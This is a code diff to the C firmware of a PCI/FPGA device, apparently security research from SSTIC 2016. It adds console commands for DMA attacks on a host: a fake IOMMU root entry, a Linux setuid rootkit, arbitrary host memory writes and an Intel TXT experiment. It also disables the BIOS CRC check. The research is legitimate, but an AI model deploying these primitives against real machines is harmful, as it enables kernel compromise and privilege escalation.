@@ -51,6 +51,8 @@
 #include <debug_server.h>
 
 #include <challenge.h>
+#include <iommu_pwn.h>
+#include <endian.h>
 
 extern void boot_helper(unsigned int r1, unsigned int r2, unsigned int r3, unsigned int r4, unsigned int addr);
 
@@ -81,9 +83,9 @@ static unsigned char rip[] = {192, 168, 0, 14};
 
 /* General address space functions */
 static const char banner[]=
-  "\n*****************************************\n"
-	"SSTIC 2014 remote integrity checking BIOS\n"
-  "*****************************************\n\n";
+  "\n**********************************\n"
+	"        SSTIC 2016 PWN BIOS\n"
+  "**********************************\n";
 
 static void dummy_write_hook(char c)
 {
@@ -107,7 +109,7 @@ static int dummy_read_nonblock_hook(void)
   irq_setmask(0);
 
 	for (i=0; i<0x1000; i++) asm("nop;");
-  
+
   irq_setmask(oldmask);
 
 	return 0;
@@ -313,7 +315,12 @@ static void help(void)
 	puts("exp_dl     - tftp download expansion rom : rom.bin");
 	puts("mpu_dl     - tftp download mpu binary : mpu.bin");
 	puts("mpu_dump   - Dumps the 0x100 first bytes of the mpu program");
-	puts("hm_read    - start checker in host memory read mode on specified page");
+	puts("hm_read    - memory read on specified page");
+	puts("hm_write   - memory write of dw at specified address");
+	puts("iommu_pwn  - I/O MMU attack write fake root entry, param ctx table @");
+	puts("rk_setuid  - I/O MMU attack linux rootkit");
+	puts("pwn        - Infinite write to low, high address of data");
+	puts("pwn_sinit  - Intel SINIT with tboot experiment");
 	puts("hm_stat    - Displays host memory module stats");
 	puts("hm_dump    - Dumps the 0x100 first bytes of the page read in hm");
 	puts("pci_info   - Prints information about the PCI state of the core");
@@ -325,6 +332,8 @@ static void help(void)
 	puts("mr         - read address space");
 	puts("mw         - write address space");
 	puts("mc         - copy address space");
+	puts("debug      - Toggle HM debug mode");
+  puts("sw         - Display switches states");
 }
 
 void challenge_start(void) {
@@ -352,8 +361,14 @@ static void do_command(char *c) {
     printf("I: Rebooting...\n");
     boot(0, 0, 0, rescue, 0);
   } else if(strcmp(token, "exp_dl") == 0) {
-    challenge_dl(get_token(&c), mac, lip, rip);
-  } else if(strcmp(token, "mpu_dl") == 0) {
+    char *path = get_token(&c);
+    char *o = get_token(&c);
+    if (strcmp(o, "raw") == 0) {
+      exp_raw_dl(path, mac, lip, rip);
+    } else {
+      challenge_dl(path, mac, lip, rip);
+    }
+  }  if(strcmp(token, "mpu_dl") == 0) {
     int r;
     microudp_start(mac, IPTOINT(lip[0], lip[1], lip[2], lip[3]));
     int ip = IPTOINT(rip[0], rip[1], rip[2], rip[3]);
@@ -430,11 +445,12 @@ static void do_command(char *c) {
     count = (!count) ? 1 : count;
     same = atoi(get_token(&c));
     same = (!same) ? 1 : same;
+    printf("Reading @0x%08x%08x to @0x%08x%08x, 0x%x time each\n", high, low, 
+        high, low + (count * 0x1000), same);
     for (i = 0; i < count; i++) {
       for (j = 0; j < same; j++) {
-        r = hm_start((low & ~0xfff) + (i * 0x1000), high);
+        r = hm_start_read((low & ~0xfff) + (i * 0x1000), high);
         if(r) {
-          printf("STAT %08x\n", HM_CSR_STAT);
           break;
         }
       }
@@ -442,18 +458,56 @@ static void do_command(char *c) {
         break;
       }
     }
+    printf("Finished @ 0x%08x%08x\n", high, (low & ~0xfff) + (i * 0x1000));
     printf("hm_read end\n");
+  } else if(strcmp(token, "rk_setuid") == 0) {
+    iommu_pwn_rootkit_linux();
+  } else if(strcmp(token, "iommu_pwn") == 0) {
+    // unsigned int low = 0xd0000000;
+    unsigned int low = 0xd82c6000;
+    iommu_pwn_page(low, 0x0);
+    iommu_pwn(low);
+    // iommu_pwn_wait_for_bar();
+    // hm_start_read(0, 0);
+  } else if(strcmp(token, "pwn") == 0) {
+    unsigned int low = atoi(get_token(&c));
+    unsigned int high = atoi(get_token(&c));
+    unsigned int data = atoi(get_token(&c));
+    hm_start_write_pwn(low, high, le32toh(data));
+  } else if(strcmp(token, "pwn_sinit") == 0) {
+    unsigned int n = atoi(get_token(&c));
+    iommu_pwn_txt(n);
+  } else if(strcmp(token, "hm_stop") == 0) {
+    hm_stop_all();
+  } else if(strcmp(token, "hm_write") == 0) {
+    unsigned int low, high, data;
+    int r;
+    low = atoi(get_token(&c));
+    high = atoi(get_token(&c));
+    data = atoi(get_token(&c));
+    printf("Writing 0x%x to @0x%08x%08x\n", data, high, low);
+    r = hm_start_write(low, high, data, 0);
+    if(r) {
+      printf("STAT %08x\n", HM_CSR_STAT);
+    }
+    printf("hm_write end\n");
   } else if(strcmp(token, "hm_stat") == 0) {
     hm_stat();
     trn_stat_dump();
   } else if(strcmp(token, "hm_dump") == 0) {
     flush_cpu_dcache();
+    unsigned int o, l;
     unsigned int *ptr = (unsigned int *)&HM_MEMORY_ADDR;
-	  dump_bytes(ptr, 0x100, (unsigned)ptr);
+    l = atoi(get_token(&c));
+    o = atoi(get_token(&c));
+    if (l == 0) {
+      l = 0x100;
+    }
+	  dump_bytes(ptr, l, (unsigned)ptr + o);
   } else if(strcmp(token, "mpu_dump") == 0) {
     unsigned int *ptr = (unsigned int *)&MPU_MEMORY_ADDR;
 	  dump_bytes(ptr, 0x100, (unsigned)ptr);
-  } else if(strcmp(token, "mr") == 0) { 
+  } else if(strcmp(token, "mr") == 0) {
     mr(get_token(&c), get_token(&c));
   } else if(strcmp(token, "mw") == 0) {
     mw(get_token(&c), get_token(&c), get_token(&c));
@@ -475,8 +529,18 @@ static void do_command(char *c) {
     printf("yolo 0x%08x\n", _yolo);
   } else if(strcmp(token, "set_period") == 0) {
     challenge_set_period(atoi(get_token(&c)));
+  } else if(strcmp(token, "debug") == 0) {
+    if (HM_CSR_CTRL & HM_CTRL_DEBUG) {
+      printf("Toggle hm debug mode off\n");
+      HM_CSR_CTRL &= ~HM_CTRL_DEBUG;
+    } else {
+      printf("Toggle hm debug mode on\n");
+      HM_CSR_CTRL |= HM_CTRL_DEBUG;
+    }
   } else if(strcmp(token, "run") == 0) {
     challenge_start();
+  } else if(strcmp(token, "sw") == 0) {
+    printf("Switches (0x%02x)\n", CSR_GPIO_IN & 0xff);
   } else if(strcmp(token, "debug_run") == 0) {
     microudp_start(mac, IPTOINT(lip[0], lip[1], lip[2], lip[3]));
     int ip = IPTOINT(rip[0], rip[1], rip[2], rip[3]);
@@ -497,33 +561,33 @@ void prompt(void) {
 }
 
 extern unsigned int _edata;
-static void crcbios(void)
-{
-	unsigned int offset_bios;
-	unsigned int length;
-	unsigned int expected_crc;
-	unsigned int actual_crc;
-
-	/*
-	 * _edata is located right after the end of the flat
-	 * binary image. The CRC tool writes the 32-bit CRC here.
-	 * We also use the address of _edata to know the length
-	 * of our code.
-	 */
-  // On est recopié en zero
-  offset_bios = 0;
-	expected_crc = _edata;
-	length = (unsigned int)&_edata - offset_bios;
-  printf("CRC addresses 0x%08x 0x%08x 0x%08x 0x%08x\n", offset_bios,
-      expected_crc, length, &_edata);
-	actual_crc = crc32((unsigned char *)offset_bios, length);
-	if(expected_crc == actual_crc)
-		printf("I: BIOS CRC passed (%08x)\n", actual_crc);
-	else {
-		printf("W: BIOS CRC failed (expected %08x, got %08x)\n", expected_crc, actual_crc);
-		printf("W: The system will continue, but expect problems.\n");
-	}
-}
+// static void crcbios(void)
+// {
+// 	unsigned int offset_bios;
+// 	unsigned int length;
+// 	unsigned int expected_crc;
+// 	unsigned int actual_crc;
+//
+// 	/*
+// 	 * _edata is located right after the end of the flat
+// 	 * binary image. The CRC tool writes the 32-bit CRC here.
+// 	 * We also use the address of _edata to know the length
+// 	 * of our code.
+// 	 */
+//   // On est recopié en zero
+//   offset_bios = 0;
+// 	expected_crc = _edata;
+// 	length = (unsigned int)&_edata - offset_bios;
+//   printf("CRC addresses 0x%08x 0x%08x 0x%08x 0x%08x\n", offset_bios,
+//       expected_crc, length, &_edata);
+// 	actual_crc = crc32((unsigned char *)offset_bios, length);
+// 	if(expected_crc == actual_crc)
+// 		printf("I: BIOS CRC passed (%08x)\n", actual_crc);
+// 	else {
+// 		printf("W: BIOS CRC failed (expected %08x, got %08x)\n", expected_crc, actual_crc);
+// 		printf("W: The system will continue, but expect problems.\n");
+// 	}
+// }
 
 void print_pc(void) {
   unsigned int pc = 0;
@@ -533,9 +597,51 @@ void print_pc(void) {
   printf("Last called function had pc at 0x%04x\n", pc);
 }
 
+static int test_user_abort(void)
+{
+	char c;
+
+	puts("I: Press Q or ESC to abort boot");
+	CSR_TIMER0_COUNTER = 0;
+	CSR_TIMER0_COMPARE = 2*CSR_FREQUENCY;
+	CSR_TIMER0_CONTROL = TIMER_ENABLE;
+	while(CSR_TIMER0_CONTROL & TIMER_ENABLE) {
+		if(readchar_nonblock()) {
+			c = readchar();
+			if((c == 'Q')||(c == '\e')) {
+				puts("I: Aborted boot on user request");
+				return 0;
+			}
+//			if(c == 0x07) {
+//				vga_unblank();
+//				vga_set_console(1);
+//				netboot();
+//				return 0;
+//			}
+		}
+	}
+	return 1;
+}
+
+static void ethreset_delay(void)
+{
+	CSR_TIMER0_COUNTER = 0;
+	CSR_TIMER0_COMPARE = CSR_FREQUENCY >> 2;
+	CSR_TIMER0_CONTROL = TIMER_ENABLE;
+	while(CSR_TIMER0_CONTROL & TIMER_ENABLE);
+}
+
+static void ethreset(void)
+{
+	CSR_MINIMAC_SETUP = MINIMAC_SETUP_PHYRST;
+	ethreset_delay();
+	CSR_MINIMAC_SETUP = 0;
+	ethreset_delay();
+}
+
 int main(int i, char **c)
 {
-	CSR_GPIO_OUT = GPIO_LED1;
+	CSR_GPIO_OUT = 0xff;
 	rescue = !((unsigned int)main > FLASH_OFFSET_REGULAR_BIOS);
 
 	irq_setmask(0);
@@ -546,38 +652,33 @@ int main(int i, char **c)
 	console_set_read_hook(NULL, dummy_read_nonblock_hook);
 
 	putsnonl(banner);
-  print_pc();
-	crcbios();
-	brd_init();
+  // print_pc();
+	// crcbios();
+	// brd_init();
 
   // Time init
   time_init();
-  
+
   // checker_memory_test();
   // checker_int_test();
-  
-  // XXX run challenge by default
 
-  // Waiting for eth mac
-  printf("Waiting for the ethernet mac\n");
-  wait(), wait(), wait(), wait(), wait(), wait(), wait(), wait(), wait(),
-  wait(), wait(), wait(), wait(), wait(), wait(), wait(), wait(), wait(),
-  wait(), wait(), wait(), wait(), wait(), wait(), wait(), wait(), wait(),
-  wait(), wait(), wait(), wait(), wait(), wait(), wait(), wait(), wait();
+	ethreset(); /* < that pesky ethernet PHY needs two resets at times... */
 
-//   printf("Auto-boot...\n");
-//   int j = 0, r = -1;
-//   while (j < 5 && r == -1) {
-//     printf("Downloading challenge, attempt %d...\n", j + 1);
-//     r = challenge_dl("cpuid.bin", mac, lip, rip);
-//     ++j;
-//     wait(), wait(), wait(), wait(), wait(), wait(), wait(), wait(), wait();
-//   }
-//   challenge_start();
-
-	while(1) {
+  if (test_user_abort()) {
+    int j = 0, r = -1;
+    printf("I: Not aborted\n");
+    printf("I: Downloading challenge, attempt %d...\n", j + 1);
+    while (j < 5 && r == -1) {
+      r = challenge_dl("cpuid.bin", mac, lip, rip);
+      ++j;
+      wait(), wait(), wait(), wait(), wait(), wait(), wait(), wait(), wait();
+    }
+  } else {
+    printf("I: Aborted\n");
+  }
+  while(1) {
     prompt();
-	}
+  }
 
 	return 0;
 }
